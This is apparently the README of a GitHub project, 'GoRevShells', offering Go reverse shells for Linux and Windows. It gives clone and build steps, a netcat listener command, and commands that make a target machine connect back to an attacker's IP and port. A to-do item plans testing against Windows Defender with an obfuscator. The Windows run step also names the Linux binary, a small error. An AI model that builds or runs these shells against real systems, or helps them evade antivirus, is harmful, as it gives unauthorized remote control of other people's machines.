[![forthebadge](https://forthebadge.com/images/badges/60-percent-of-the-time-works-every-time.svg)](https://forthebadge.com) [![forthebadge](https://forthebadge.com/images/badges/0-percent-optimized.svg)](https://forthebadge.com) [![forthebadge](https://forthebadge.com/images/badges/certified-snoop-lion.svg)](https://forthebadge.com)
# GoRevShells
Basic reverse shells for linux and windows written in Go. Based off of @yougg's Go reverse shells: https://gist.github.com/yougg/b47f4910767a74fcfe1077d21568070e

## How to run (basic compilation; plenty of guides online on how to specify target operating system & architecture)
```
$ git clone https://github.com/NihilistPenguin/GoRevShells.git
$ cd GoRevshells
```
#### For linux target:
```
$ cd linux
$ GOOS=linux go build linrev.go
```
Start netcat listener on host: `$ nc -nvlp PORT`<br>
On target machine: `$ ./linrev IP:PORT` or `$ ./linrev` (uses value set in *const default_host* of linrev.go file)

#### For windows target:
```
$ cd windows
$ GOOS=windows go build winrev.go
```
Start netcat listener on host: `$ nc -nvlp PORT`<br>
On target machine: `$ .\winrev IP:PORT` or `$ .\linrev` (uses value set in *const default_host* of linrev.go file)


## TODO:
- add option for verbose output
- make it not infinitely attempt to dial
- test it with obfuscator against Windows Defender
- add functionality for upload/download?
- other stuff I can't think of right now
